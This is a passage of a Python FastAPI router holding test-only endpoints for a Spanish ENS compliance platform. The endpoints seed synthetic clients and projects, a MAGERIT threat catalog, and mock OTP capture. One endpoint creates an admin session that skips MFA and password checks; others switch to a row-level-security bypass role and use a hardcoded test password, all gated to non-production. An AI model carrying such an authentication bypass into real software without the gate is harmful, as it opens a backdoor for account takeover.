"""
Router /api/v1/_dev/* — endpoints auxiliares dev/test.

PROHIBIDO en producción: gate `not get_settings().is_production`. El
include en `backend/app/main.py` también condiciona el registro.
Doble defensa: incluso si alguien lo registra accidentalmente,
cada endpoint comprueba el gate.

Casos uso (SUB-FASE 3.F + SAN-E v3.MB-5.3.D tests Playwright):
- GET  /seed-info             → UUID Marcos (helpers loginAsMarcos)
- POST /create-test-client    → cliente sintético idempotente
- POST /seed-dda-alta-project → upgrade test project ALTA + generate DdA
                                 73 entries pre-set 'aplica' (cliente review E2E)
- GET  /captured-emails       → mock emails capturados (E2E OTP extraction)
- DELETE /captured-emails     → reset captured emails (test isolation)

Ver ADR-013 (separación 3 portales), ADR-019 (CSRF triple binding),
ADR-020 (sessions separadas), ADR-021 (per-project Ed25519 → MB-12).
"""
from __future__ import annotations

import asyncio
import re
import uuid
from typing import Any

from fastapi import APIRouter, Depends, HTTPException, Query, Request, Response, status
from pydantic import BaseModel
from sqlalchemy import select, text
from sqlalchemy.ext.asyncio import AsyncSession

from backend.app.auth import service as auth_service
from backend.app.auth.api import _set_auth_cookies
from backend.app.auth.crypto import hash_password
from backend.app.config import get_settings
from backend.app.core.email.sender import (
    get_captured_emails,
    reset_captured_emails,
)
from backend.app.database import get_db, set_tenant_context
from backend.app.models.auth import User
from backend.app.models.client_portal import ClientUser
from backend.app.models.core import Client, Project
from backend.app.models.ens import DdaEntry
from backend.app.motors.m02_magerit.models import (
    MageritAnalysis,
    MageritAsset,
    MageritThreat,
    MageritThreatAssessment,
)
from backend.app.motors.m03_dda.enums import CategoriaSistema
from backend.app.motors.m08_verification.models import VerificationRun
from backend.app.models.conformity_lifecycle import BasicDeclarationRow
from backend.app.models.documents import Evidence
from backend.app.motors.m05_signing.models import SigningEvent, SigningIntent


router = APIRouter(prefix="/_dev", tags=["_dev"])


def _require_non_production() -> None:
    """Defensa explícita por endpoint. 404 (no 403) para no
    revelar que el router existe a clientes prod accidentales."""
    if get_settings().is_production:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND, detail="Not Found",
        )


class SeedInfoResponse(BaseModel):
    marcos_user_id: str
    marcos_email: str


@router.get("/seed-info", response_model=SeedInfoResponse)
async def seed_info(
    db: AsyncSession = Depends(get_db),
) -> SeedInfoResponse:
    """Devuelve UUID de Marcos owner para que los helpers
    Playwright firmen JWTs con el `sub` correcto."""
    _require_non_production()

    result = await db.execute(
        select(User).where(
            User.email.in_([get_settings().marcos_admin_email, "marcos@fulkro.es"])
        )
    )
    marcos = result.scalar_one_or_none()
    if not marcos:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail="Marcos seed not found (auth_users)",
        )
    return SeedInfoResponse(
        marcos_user_id=str(marcos.id),
        marcos_email=marcos.email,
    )


class CreateTestClientResponse(BaseModel):
    user_id: str
    email: str
    password: str
    role: str
    client_id: str
    project_id: str


_TEST_CLIENT_NOMBRE = "Test E2E Client"
_TEST_CLIENT_CIF = "B00000000"
_TEST_USER_EMAIL = "test-client-e2e@example.com"
_TEST_USER_PASSWORD = "TestP@ssw0rd123!"
_TEST_USER_ROLE = "lectura_solo"
_TEST_PROJECT_NOMBRE = "Proyecto ENS Test E2E"

# ── Proyecto FIJO E2E (UUID determinista) ──────────────────────────────
# Las specs SAN-E v3 (san_e_v3/mb3_* + mb4_*) y admin-settings hardcodean
# `E2E_SEED_PROJECT_ID ?? "00000000-0000-0000-0000-000000000001"` para
# navegar a `/admin/projects/{id}/<tab>` SIN resolver el proyecto del cliente
# de test (que tiene UUID aleatorio). Sin un proyecto en ese UUID exacto las
# páginas project-scoped renderizan el gate "proyecto no encontrado" y ~38
# specs fallan en cascada. `seed-rich-demo-project` crea ese proyecto bajo el
# cliente de test con datos ricos (MAGERIT + DdA) → los paneles data-dependent
# renderizan estructura + contenido. Idempotente.
_FIXED_DEMO_PROJECT_ID = uuid.UUID("00000000-0000-0000-0000-000000000001")
_FIXED_DEMO_PROJECT_NOMBRE = "Proyecto Fijo E2E"
# Cliente DEDICADO aislado para el proyecto fijo. CRÍTICO: NO usar el cliente
# de test compartido (_TEST_CLIENT_CIF) porque el proyecto fijo tendría el
# `created_at` más reciente y ganaría la resolución R27 (`ORDER BY created_at
# DESC LIMIT 1`) del portal cliente → rompería los specs cliente que comparten
# el cliente de test (incidents · pentest-auth · etc.). Las specs SAN-E v3
# loguean como MARCOS (admin/owner) y navegan por UUID directo → acceden al
# proyecto sin importar el cliente. Aislándolo, NO contaminamos R27.
_FIXED_DEMO_CLIENT_CIF = "B00000F1X"
_FIXED_DEMO_CLIENT_NOMBRE = "Test E2E Client FIXED-DEMO"


_SECONDARY_CLIENT_NOMBRE = "Test E2E Client SECONDARY"
_SECONDARY_CLIENT_CIF = "B00000001"
_SECONDARY_USER_EMAIL = "test-client-e2e-secondary@example.com"
_SECONDARY_PROJECT_NOMBRE = "Proyecto ENS Test E2E Secondary"


# ── Tarea C · clientes DEDICADOS por tier para specs conformidad/firma ──
#
# Causa raíz (Workflow 2): los seeds de tier (seed-dda-alta-project ·
# seed-conformidad-ready) operaban TODOS sobre el ÚNICO client+project
# `_TEST_CLIENT_CIF`/`_TEST_PROJECT_NOMBRE`, mutando su `categoria_objetivo`.
# Con varios spec-files en paralelo (Playwright corre 1 worker por fichero;
# `fullyParallel:false` sólo serializa DENTRO de un fichero) las specs
# compiten por ese único proyecto: dda-firma siembra ALTA mientras
# conformidad-basica siembra BÁSICA al MISMO proyecto → el portal resuelve
# por R27 (`SELECT id FROM projects WHERE client_id=:cid ORDER BY created_at
# DESC LIMIT 1`) la categoría que ganó la última escritura → aserciones de
# tier fallan (ej. dda-firma muestra "Categoría Básica" con 73 medidas).
#
# Fix mínimo y aislado: cada spec/tier que necesita una categoría concreta
# usa un CLIENT DEDICADO (`key`) con su ÚNICO proyecto → R27 LIMIT 1 resuelve
# determinísticamente ese proyecto. El `key=None` (default) preserva el
# comportamiento legacy intacto (NO rompe los 6 dashboards verdes ni el resto
# de specs que dependen del client compartido).
#
# CIF dedicado: B000001XX · email <key>@e2e.fulkro.example (recipiente único →
# aísla también la captura de OTP, que `waitForOtp` filtra por `to`). Dominio
# `.example` (NO `.test`): el login cliente valida con EmailStr y rechaza `.test`.
_DEDICATED_KEYS: dict[str, str] = {
    # key            → sufijo CIF de 2 dígitos (B000001XX)
    "dda-firma": "10",
    "conformidad-basica": "11",
    "conformidad-media": "12",
    "conformidad-alta": "13",
    "firmas-hub": "14",
}


def _resolve_test_identity(key: str | None) -> tuple[str, str, str, str]:
    """Devuelve (cif, user_email, project_nombre, client_nombre) para un `key`.

    `key=None` → identidad compartida legacy (client `B00000000`). Cualquier
    `key` válido → identidad DEDICADA aislada (1 client + 1 project). Un `key`
    desconocido es 400 (evita typos silenciosos en las specs).
    """
    if key is None:
        return (
            _TEST_CLIENT_CIF,
            _TEST_USER_EMAIL,
            _TEST_PROJECT_NOMBRE,
            _TEST_CLIENT_NOMBRE,
        )
    suffix = _DEDICATED_KEYS.get(key)
    if suffix is None:
        raise HTTPException(
            status_code=400,
            detail=(
                f"key {key!r} desconocido · usa uno de "
                f"{sorted(_DEDICATED_KEYS)} o omítelo (client compartido)"
            ),
        )
    return (
        f"B0000{suffix.zfill(4)}",  # ej. B0000010 · CIF dedicado por tier
        # Dominio `.example` (RFC 2606) · NO `.test`: el endpoint de login
        # cliente valida `email` con pydantic EmailStr, y `.test` es un TLD
        # special-use/reserved que email-validator RECHAZA (422 → el portal
        # nunca redirige al dashboard → waitForURL timeout). `.example` es
        # igualmente reservado pero SÍ válido para EmailStr, y mantiene el
        # aislamiento por `to` que usa waitForOtp.
        f"{key}@e2e.fulkro.example",
        f"Proyecto ENS E2E {key}",
        f"Test E2E Client {key}",
    )


@router.post("/create-test-client", response_model=CreateTestClientResponse)
async def create_test_client(
    secondary: bool = Query(
        False,
        description=(
            "Si True · crea/devuelve segundo cliente isolated para tests "
            "cross-cliente isolation (Sesión 3B-2B.4 Phase 1.5)."
        ),
    ),
    db: AsyncSession = Depends(get_db),
) -> CreateTestClientResponse:
    """Crea (o devuelve si ya existe) cliente sintético + ClientUser +
    Project demo para tests E2E. Idempotente: múltiples llamadas
    devuelven el mismo par. Password fija conocida por los helpers
    Playwright.

    `secondary=true` (Sesión 3B-2B.4 Phase 1.5) crea/devuelve un segundo
    cliente isolated (B00000001) para empirical cross-cliente isolation
    verification (audit project-scoped pages NO leak cliente A → cliente B).
    """
    _require_non_production()
    if secondary:
        client_nombre = _SECONDARY_CLIENT_NOMBRE
        client_cif = _SECONDARY_CLIENT_CIF
        user_email = _SECONDARY_USER_EMAIL
        project_nombre = _SECONDARY_PROJECT_NOMBRE
    else:
        client_nombre = _TEST_CLIENT_NOMBRE
        client_cif = _TEST_CLIENT_CIF
        user_email = _TEST_USER_EMAIL
        project_nombre = _TEST_PROJECT_NOMBRE

    # Las tablas projects/client_users tienen RLS policies enforced
    # contra fulkro_app (NOSUPERUSER). Elevamos a fulkro (superuser,
    # owner) DENTRO de esta transacción para bypass — patrón idéntico
    # al de los GET endpoints como /client-portal/project. RESET no
    # necesario: la transacción termina con commit y la conexión
    # vuelve al pool con su role fulkro_app por defecto.
    await db.execute(text("SET LOCAL ROLE fulkro_app_bypassrls"))

    # Cliente empresa: get-or-create por CIF (única por unique constraint)
    result = await db.execute(select(Client).where(Client.cif == client_cif))
    test_client = result.scalar_one_or_none()
    if test_client is None:
        test_client = Client(
            id=uuid.uuid4(), nombre=client_nombre, cif=client_cif,
        )
        db.add(test_client)
        await db.flush()

    # ClientUser: get-or-create por (client_id, email)
    result = await db.execute(
        select(ClientUser).where(
            ClientUser.client_id == test_client.id,
            ClientUser.email == user_email,
        )
    )
    test_user = result.scalar_one_or_none()
    if test_user is None:
        # Bug #4 fix smoke 5.11: ClientUser.role dropped en MB-3 cleanup
        # (commit 5ccf114 · single-user-RW pattern). _TEST_USER_ROLE keep
        # como respuesta API placeholder solo.
        test_user = ClientUser(
            id=uuid.uuid4(),
            client_id=test_client.id,
            email=user_email,
            password_hash=hash_password(_TEST_USER_PASSWORD),
            full_name=f"{client_nombre} User",
            must_change_password=False,
        )
        db.add(test_user)
        await db.flush()

    # Project demo: get-or-create por (client_id, nombre). Sin esto el
    # endpoint /client-portal/project devuelve 404 y el dashboard
    # cliente muestra cards vacías.
    result = await db.execute(
        select(Project).where(
            Project.client_id == test_client.id,
            Project.nombre == project_nombre,
        )
    )
    test_project = result.scalar_one_or_none()
    if test_project is None:
        test_project = Project(
            id=uuid.uuid4(),
            client_id=test_client.id,
            nombre=project_nombre,
            categoria_objetivo="MEDIA",
            estado="active",
            lifecycle_state="ACTIVE",
        )
        db.add(test_project)
        await db.flush()

    await db.commit()
    return CreateTestClientResponse(
        user_id=str(test_user.id),
        email=test_user.email,
        password=_TEST_USER_PASSWORD,
        role=_TEST_USER_ROLE,  # ClientUser.role dropped MB-3 · constant placeholder
        client_id=str(test_client.id),
        project_id=str(test_project.id),
    )


class SetTestProjectCategoryResponse(BaseModel):
    project_id: str
    previous: str | None
    current: str


@router.post(
    "/set-test-project-category",
    response_model=SetTestProjectCategoryResponse,
)
async def set_test_project_category(
    tier: str = Query(..., description="BASICA | MEDIA | ALTA"),
    db: AsyncSession = Depends(get_db),
) -> SetTestProjectCategoryResponse:
    """Cambia categoria_objetivo del test project · sub-atom 1.C.C.C E2E support.

    Endpoint env-gated (non-production) idempotente. Usado por la suite E2E
    fase_12 para validar el filtrado de registros vivos y feature flags per
    categoría sin tener que invocar `seed-conformidad-ready` (heavy).

    Pre-requisito: el test client + project deben existir (llamar
    `/create-test-client` primero · idempotente).
    """
    _require_non_production()
    if tier not in ("BASICA", "MEDIA", "ALTA"):
        raise HTTPException(400, f"Invalid tier {tier!r} · use BASICA/MEDIA/ALTA")

    await db.execute(text("SET LOCAL ROLE fulkro_app_bypassrls"))
    test_client = (
        await db.execute(select(Client).where(Client.cif == _TEST_CLIENT_CIF))
    ).scalar_one_or_none()
    if test_client is None:
        raise HTTPException(
            400, "Test client no existe · llamar /_dev/create-test-client primero",
        )
    test_project = (
        await db.execute(
            select(Project).where(
                Project.client_id == test_client.id,
                Project.nombre == _TEST_PROJECT_NOMBRE,
            )
        )
    ).scalar_one_or_none()
    if test_project is None:
        raise HTTPException(
            400, "Test project no existe · llamar /_dev/create-test-client primero",
        )

    previous = test_project.categoria_objetivo
    test_project.categoria_objetivo = tier
    await db.commit()
    return SetTestProjectCategoryResponse(
        project_id=str(test_project.id),
        previous=previous,
        current=tier,
    )


# ════════════════════════════════════════════════════════════════════
# Sim MEDIO full-cloth · lever del arco comercial "de cero"
# ════════════════════════════════════════════════════════════════════
class SeedCommercialLeadResponse(BaseModel):
    lead_id: str
    project_id: str
    client_id: str
    empresa_nombre: str
    empresa_cif: str
    contacto_email: str
    categoria_objetivo_ens: str


@router.post(
    "/seed-commercial-lead", response_model=SeedCommercialLeadResponse
)
async def seed_commercial_lead(
    project_id: str | None = Query(
        default=None,
        description="Proyecto destino · si se omite usa el test project E2E",
    ),
    db: AsyncSession = Depends(get_db),
) -> SeedCommercialLeadResponse:
    """Crea un Lead ficticio realista (empresa privada que licita a la AAPP ·
    categoría MEDIA) y enriquece la identidad del cliente de test
    (razon_social/domicilio/contacto/sector · NUNCA el `cif`, que es la clave de
    lookup de los demás levers) para que el arco comercial E2E
    (propuesta → contrato → firma) sea 'de cero' y los entregables (contrato,
    E-040, distintivo) lean con datos realistas.

    No existe endpoint `POST /leads` (los leads venían del radar retirado): este
    lever cubre el ÚNICO hueco de la cadena comercial. El resto (propuesta,
    contrato, sign-marcos, send-client) se conduce vía la API real
    `/commercial` + `/contracts`. Idempotent (dedup de lead por email+origen).
    Env-gated non-production.
    """
    _require_non_production()
    from backend.app.motors.m13_commercial.services.lead_service import (
        LeadService,
    )

    await db.execute(text("SET LOCAL ROLE fulkro_app_bypassrls"))

    test_client = (
        await db.execute(select(Client).where(Client.cif == _TEST_CLIENT_CIF))
    ).scalar_one_or_none()
    if test_client is None:
        raise HTTPException(
            400, "Test client no existe · llamar /_dev/create-test-client primero",
        )

    if project_id:
        target = (
            await db.execute(
                select(Project).where(Project.id == uuid.UUID(project_id))
            )
        ).scalar_one_or_none()
    else:
        target = (
            await db.execute(
                select(Project).where(
                    Project.client_id == test_client.id,
                    Project.nombre == _TEST_PROJECT_NOMBRE,
                )
            )
        ).scalar_one_or_none()
    if target is None:
        raise HTTPException(
            400, "Test project no existe · llamar /_dev/create-test-client primero",
        )

    # Identidad ficticia realista (NO el cif · es la clave de lookup).
    empresa = "Innovación Digital del Guadalquivir, S.L."
    test_client.nombre = empresa
    if hasattr(test_client, "domicilio_fiscal"):
        test_client.domicilio_fiscal = "C/ Luis Montoto 107, 41007 Sevilla"
    if hasattr(test_client, "persona_contacto"):
        test_client.persona_contacto = "Lucía Ramírez Cabrera"
    if hasattr(test_client, "sector"):
        test_client.sector = "Servicios tecnológicos · SaaS para la AAPP"
    await db.flush()

    lead = await LeadService(db).create_lead(
        empresa_nombre=empresa,
        contacto_email="lucia.ramirez@idguadalquivir.example",
        empresa_cif=_TEST_CLIENT_CIF,
        sector="Servicios tecnológicos · SaaS para la AAPP",
        origen="manual",
        contacto_telefono="+34 955 123 456",
        contacto_position="Directora de Operaciones",
        notas=(
            "Lead ficticio E2E · empresa privada que licita a la AAPP · "
            "requiere implantación y certificación ENS MEDIO para concursar."
        ),
        asignado_a="Marcos",
        categoria_objetivo_ens="MEDIA",
        estado_contacto="nuevo",
    )
    await db.commit()
    return SeedCommercialLeadResponse(
        lead_id=str(lead.id),
        project_id=str(target.id),
        client_id=str(test_client.id),
        empresa_nombre=lead.empresa_nombre,
        empresa_cif=_TEST_CLIENT_CIF,
        contacto_email=lead.contacto_email or "",
        categoria_objetivo_ens="MEDIA",
    )


class LoginAsMarcosResponse(BaseModel):
    user_id: str
    email: str
    jti: str
    expires_at: str


@router.post("/login-as-marcos", response_model=LoginAsMarcosResponse)
async def login_as_marcos(
    request: Request,
    response: Response,
    db: AsyncSession = Depends(get_db),
) -> LoginAsMarcosResponse:
    """Crea sesión auth real para Marcos + cookies httpOnly +
    csrf. Bypassa MFA (TOTP/WebAuthn) y password verify. Solo
    para tests E2E Playwright (helpers/auth-real.ts::loginAsMarcos).

    Reusa `auth_service.create_session` y `_set_auth_cookies` del
    flow admin real — la sesión que crea es indistinguible de un
    login Marcos normal en BD (auth_sessions row con jti +
    expires_at + ip_address + user_agent reales). De esta forma
    `/auth/me` (que verifica revocation lookup contra BD) acepta
    la sesión en tests.

    Por qué este endpoint vs Playwright firmando JWT con jose:
    backend hace double check (signature + BD revocation, ADR
    pendiente). JWT pre-firmado sin sesión BD = 401 en `/auth/me`.
    """
    _require_non_production()

    result = await db.execute(
        select(User).where(
            User.email.in_([get_settings().marcos_admin_email, "marcos@fulkro.es"])
        )
    )
    marcos = result.scalar_one_or_none()
    if not marcos:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail="Marcos seed not found (auth_users)",
        )

    token, csrf, expires_at, jti = await auth_service.create_session(
        db,
        user=marcos,
        ip_address=request.client.host if request.client else None,
        user_agent=request.headers.get("user-agent"),
    )
    await db.commit()

    _set_auth_cookies(
        response,
        session_token=token,
        csrf_token=csrf,
        expires_at=expires_at,
    )
    return LoginAsMarcosResponse(
        user_id=str(marcos.id),
        email=marcos.email,
        jti=jti,
        expires_at=expires_at.isoformat(),
    )


# ════════════════════════════════════════════════════════════════════
# SAN-E v3.MB-5.3.D · email mock capture + DdA seed
# ════════════════════════════════════════════════════════════════════


class CapturedEmailsResponse(BaseModel):
    captured: list[dict[str, Any]]
    count: int


@router.get("/captured-emails", response_model=CapturedEmailsResponse)
async def list_captured_emails(
    to: str | None = Query(None, description="Filtra por destinatario exacto"),
    subject_pattern: str | None = Query(
        None, description="Substring case-insensitive en subject",
    ),
) -> CapturedEmailsResponse:
    """Mock emails capturados (backend == 'mock' · dev/test only).

    Para E2E Playwright: ``waitForOtp`` fixture poll este endpoint y
    extrae 6 dígitos del html_body con regex.
    """
    _require_non_production()
    emails = get_captured_emails(to=to, subject_pattern=subject_pattern)
    return CapturedEmailsResponse(captured=emails, count=len(emails))


@router.delete("/captured-emails", status_code=status.HTTP_204_NO_CONTENT)
async def reset_captured_emails_endpoint() -> Response:
    """Limpia captured emails entre tests Playwright."""
    _require_non_production()
    reset_captured_emails()
    return Response(status_code=status.HTTP_204_NO_CONTENT)


class WaitForOtpResponse(BaseModel):
    otp_code: str
    email_to: str
    elapsed_seconds: float


@router.get("/captured-emails/wait-for-otp", response_model=WaitForOtpResponse)
async def wait_for_otp(
    to: str = Query(..., description="Email destinatario donde esperar OTP"),
    timeout_seconds: int = Query(
        10, ge=1, le=60, description="Timeout polling segundos",
    ),
) -> WaitForOtpResponse:
    """Poll captured emails hasta arrival OTP · returns 6-digit code.

    Pattern E2E Playwright: post-trigger request-otp endpoint cliente,
    test fixture llama este helper backend para sincronizar con email
    arrival sin sleep arbitrario.
    """
    _require_non_production()

    deadline = asyncio.get_event_loop().time() + timeout_seconds
    start = asyncio.get_event_loop().time()
    otp_re = re.compile(r"\b(\d{6})\b")
    while asyncio.get_event_loop().time() < deadline:
        emails = get_captured_emails(
            to=to, subject_pattern="codigo de seguridad",
        )
        if emails:
            html = emails[-1]["html_body"]
            match = otp_re.search(html)
            if match:
                return WaitForOtpResponse(
                    otp_code=match.group(1),
                    email_to=to,
                    elapsed_seconds=(asyncio.get_event_loop().time() - start),
                )
        await asyncio.sleep(0.25)

    raise HTTPException(
        status_code=status.HTTP_408_REQUEST_TIMEOUT,
        detail=f"OTP no recibido para {to} en {timeout_seconds}s",
    )


class SeedDdaAltaResponse(BaseModel):
    project_id: str
    client_id: str
    user_email: str
    user_password: str
    categoria_objetivo: str
    dda_entries_count: int
    pre_set_status: str
    note: str


@router.post("/seed-dda-alta-project", response_model=SeedDdaAltaResponse)
async def seed_dda_alta_project(
    key: str | None = Query(
        default=None,
        description=(
            "Tarea C · si se indica, opera sobre un CLIENT DEDICADO aislado "
            "(1 client + 1 project) para evitar el race cross-spec por R27 "
            "LIMIT 1 sobre el client compartido. Omitir = legacy compartido."
        ),
    ),
    db: AsyncSession = Depends(get_db),
) -> SeedDdaAltaResponse:
    """Upgrade test project a ALTA + generate DdA + 73 entries pre-set 'aplica'.

    Idempotent: si project ya tiene >=70 entries (DdA generada), retorna
    info existente sin re-generar.

    Flow:
    1. Get/create test client + user + project (reusa create_test_client)
    2. Update project.categoria_objetivo='ALTA' (si !='ALTA')
    3. Generate DdA via DdaService (categoria ALTA · 73 entries)
    4. Pre-set todas entries with aplicabilidad='aplica' + estado_implementacion='implantada'
       (admin paso · cliente solo review en E2E test)
    """
    _require_non_production()

    cif, user_email, project_nombre, client_nombre = _resolve_test_identity(key)

    # 1. Get/create test infra reutilizando funciones core
    await db.execute(text("SET LOCAL ROLE fulkro_app_bypassrls"))
    test_client = (
        await db.execute(select(Client).where(Client.cif == cif))
    ).scalar_one_or_none()
    if test_client is None:
        test_client = Client(
            id=uuid.uuid4(), nombre=client_nombre, cif=cif,
        )
        db.add(test_client)
        await db.flush()

    test_user = (await db.execute(
        select(ClientUser).where(
            ClientUser.client_id == test_client.id,
            ClientUser.email == user_email,
        )
    )).scalar_one_or_none()
    if test_user is None:
        # Bug #4 fix smoke 5.11: ClientUser.role dropped MB-3 cleanup.
        test_user = ClientUser(
            id=uuid.uuid4(),
            client_id=test_client.id,
            email=user_email,
            password_hash=hash_password(_TEST_USER_PASSWORD),
            full_name="Test E2E User",
            must_change_password=False,
        )
        db.add(test_user)
        await db.flush()

    test_project = (await db.execute(
        select(Project).where(
            Project.client_id == test_client.id,
            Project.nombre == project_nombre,
        )
    )).scalar_one_or_none()
    if test_project is None:
        test_project = Project(
            id=uuid.uuid4(),
            client_id=test_client.id,
            nombre=project_nombre,
            categoria_objetivo="ALTA",
            estado="active",
            lifecycle_state="ACTIVE",
        )
        db.add(test_project)
        await db.flush()
    elif test_project.categoria_objetivo != "ALTA":
        test_project.categoria_objetivo = "ALTA"
        await db.flush()

    # 2. Set tenant context para DdaService (RLS dda_entries)
    await set_tenant_context(
        db, client_id=test_client.id, project_id=test_project.id,
    )

    # 3. Idempotency check · si ya hay >=70 entries assume DdA generated
    existing_count = (await db.execute(
        select(text("count(*)"))
        .select_from(DdaEntry)
        .where(DdaEntry.project_id == test_project.id)
        .where(DdaEntry.deleted_at.is_(None))
    )).scalar_one()
    already_seeded = bool(existing_count and existing_count >= 70)

    if not already_seeded:
        # 4. Generate DdA via DdaService
        # Bug #3 fix smoke 5.11: pasar CategoriaSistema enum (NO string)
        # service.generate_dda espera enum · accede .value en LP de refuerzos.
        # enforce_gates=False · seed dev NO crea categorization upstream
        from backend.app.motors.m03_dda.service import DdaService
        svc = DdaService(db)
        await svc.generate_dda(
            project_id=test_project.id,
            system_category=CategoriaSistema.ALTA,
            responsable="E2E Test RSEG",
            enforce_gates=False,
        )

        # 5. Pre-set todas entries aplicables como 'aplica' + 'implantada'
        await db.execute(
            text(
                "UPDATE dda_entries SET aplicabilidad='aplica', "
                "estado_implementacion='implantada' "
                "WHERE project_id = :pid AND deleted_at IS NULL "
                "AND aplicabilidad IS DISTINCT FROM 'no_aplica'"
            ),
            {"pid": str(test_project.id)},
        )

    # 6. CONGELAR la DdA (aprobado_por) · SIEMPRE, idempotente. El gate de firma
    #    cliente v3.11 exige DdA aprobada por Marcos (modelo "indispensable-
    #    cliente-only": el cliente NO revisa medida-por-medida). Sin esto,
    #    ready_for_final_sign nunca llega a True y el cliente no puede firmar.
    await db.execute(
        text(
            "UPDATE dda_entries SET aprobado_por = :ap, fecha_aprobacion = current_date "
            "WHERE project_id = :pid AND deleted_at IS NULL "
            "AND aplicabilidad IS DISTINCT FROM 'no_aplica'"
        ),
        {"ap": "E2E Test Marcos", "pid": str(test_project.id)},
    )

    # 7. Pizarra limpia de firmas · el gate exige last_signed IS NULL para montar
    #    el botón firmar (idempotencia cross-run). Borramos TODAS las firmas del
    #    proyecto (no solo 'dda'): borrar solo dda dejaría huecos en la cadena
    #    hash R6 (los dda son los primeros · romperían previous_signature_hash de
    #    magerit/pentest). Tras el reset el cliente firma 1 dda → cadena lineal
    #    válida desde génesis (chain-integrity OK). FK triggers OFF (datos test).
    # Cirugía de rol (2026-06-07): el seed corre como fulkro_app_bypassrls
    # (NOSUPERUSER) → NO se puede usar session_replication_role (superuser-only).
    # No hace falta: signing_events/intents NO tienen triggers y los FK a
    # signing_intents son CASCADE (signing_events, signing_otp_codes) / SET NULL
    # (contracts) → borrar por project_id en orden es suficiente. Borramos
    # signing_events por su columna project_id (alcanza HUÉRFANOS · evita huecos
    # en la cadena hash R6) y luego signing_intents (CASCADE limpia el resto).
    await db.execute(
        text("DELETE FROM signing_events WHERE project_id = :pid"),
        {"pid": str(test_project.id)},
    )
    await db.execute(
        text("DELETE FROM signing_intents WHERE project_id = :pid"),
        {"pid": str(test_project.id)},
    )

    final_count = (await db.execute(
        select(text("count(*)"))
        .select_from(DdaEntry)
        .where(DdaEntry.project_id == test_project.id)
        .where(DdaEntry.deleted_at.is_(None))
    )).scalar_one()

    await db.commit()
    return SeedDdaAltaResponse(
        project_id=str(test_project.id),
        client_id=str(test_client.id),
        user_email=test_user.email,
        user_password=_TEST_USER_PASSWORD,
        categoria_objetivo="ALTA",
        dda_entries_count=int(final_count),
        pre_set_status="aplica",
        note=(
            "DdA seeded + congelada (aprobado_por) + sin firmar · cliente E2E firma final"
            if not already_seeded
            else "DdA reusada + re-congelada + reset firma · cliente E2E firma final"
        ),
    )


# ════════════════════════════════════════════════════════════════════
# SAN-E v3.MB-5.4.D · MAGERIT seed E2E test
# ════════════════════════════════════════════════════════════════════


class SeedMageritAltaResponse(BaseModel):
    project_id: str
    client_id: str
    analysis_id: str
    assets_count: int
    risks_count: int
    note: str


# Threats catalog mínimo · 8 codes per E2E test
_THREAT_CATALOG_SEED: list[dict] = [
    {
        "code": "A.5", "name": "Suplantacion de la identidad",
        "group_code": "A",
        "description": "Atacante usurpa identidad legitima para acceso indebido.",
        "affected_dimensions": ["I", "C", "A"],
    },
    {
        "code": "A.6", "name": "Abuso de privilegios de acceso",
        "group_code": "A",
        "description": "Usuario autorizado ejecuta acciones que exceden sus permisos.",
        "affected_dimensions": ["I", "C", "A"],
    },
    {
        "code": "A.7", "name": "Uso no previsto",
        "group_code": "A",
        "description": "Uso del recurso para fines distintos a los autorizados.",
        "affected_dimensions": ["D", "I"],
    },
    {
        "code": "A.11", "name": "Acceso no autorizado",
        "group_code": "A",
        "description": "Acceso a informacion o servicio sin autorizacion.",
        "affected_dimensions": ["I", "C", "A"],
    },
    {
        "code": "A.18", "name": "Destruccion de informacion",
        "group_code": "A",
        "description": "Borrado deliberado de informacion sensible.",
        "affected_dimensions": ["I", "T"],
    },
    {
        "code": "E.1", "name": "Errores de los usuarios",
        "group_code": "E",
        "description": "Equivocaciones del personal en operacion.",
        "affected_dimensions": ["D", "I"],
    },
    {
        "code": "E.2", "name": "Errores del administrador",
        "group_code": "E",
        "description": "Equivocaciones operativas en administracion.",
        "affected_dimensions": ["D", "I", "T"],
    },
    {
        "code": "I.5", "name": "Averia de origen fisico o logico",
        "group_code": "I",
        "description": "Fallo hardware o software no provocado.",
        "affected_dimensions": ["D"],
    },
    {
        "code": "I.6", "name": "Corte del suministro electrico",
        "group_code": "I",
        "description": "Interrupcion del suministro de energia.",
        "affected_dimensions": ["D"],
    },
    {
        "code": "I.8", "name": "Fallo de servicios de comunicaciones",
        "group_code": "I",
        "description": "Cese de los servicios de comunicacion externos.",
        "affected_dimensions": ["D"],
    },
]


_ASSETS_SEED: list[tuple[str, str, str, str, int, int, int, int, int]] = [
    # (code, name, asset_type_code, description, value_d, value_i, value_c, value_a, value_t)
    ("AS-001", "BD Cliente Produccion", "D", "Base de datos PostgreSQL produccion · datos cliente", 10, 10, 10, 8, 8),
    ("AS-002", "API Publica SaaS",      "S", "API REST publica · entry point SaaS",                 10, 8, 6, 8, 6),
    ("AS-003", "Backend FastAPI",       "SW", "Backend Python FastAPI · monolito principal",         10, 10, 8, 8, 8),
    ("AS-004", "Servidor Hetzner Prod", "HW", "Servidor dedicado produccion · Hetzner Falkenstein",  10, 8, 8, 8, 6),
    ("AS-005", "DC Falkenstein EU",     "L", "Centro de datos Hetzner Falkenstein DE",               10, 6, 6, 6, 6),
    ("AS-006", "Desarrolladores TI",    "P", "Equipo TI con acceso al codigo y produccion",          8, 8, 10, 8, 6),
    ("AS-007", "Logs Audit Trail",      "D", "Audit log inmutable · cumplimiento ENS art 21",        8, 10, 8, 6, 10),
    ("AS-008", "Email Provider M18",    "COM", "Proveedor email transaccional · Postmark/SMTP",      8, 6, 6, 6, 6),
]


# (asset_code, threat_code, probability, deg_d, deg_i, deg_c, deg_a, deg_t)
_RISKS_SEED: list[tuple[str, str, str, int, int, int, int, int]] = [
    ("AS-001", "A.5",  "M", 0, 80, 100, 60, 40),
    ("AS-001", "E.1",  "A", 40, 80, 40,  0,  0),
    ("AS-001", "I.5",  "B", 100, 60, 0,  0,  0),
    ("AS-002", "A.6",  "A", 40, 100, 100, 80, 60),
    ("AS-002", "A.11", "A", 40, 80, 100, 60, 40),
    ("AS-003", "A.7",  "M", 80, 60, 40,  40, 40),
    ("AS-003", "E.2",  "M", 80, 100, 40, 0,  40),
    ("AS-004", "I.5",  "B", 100, 80, 0,  0,  0),
    ("AS-005", "I.6",  "M", 100, 0,  0,  0,  0),
    ("AS-006", "E.1",  "M", 40, 60, 60, 40, 40),
    ("AS-007", "A.18", "B", 60, 100, 0,  0, 100),
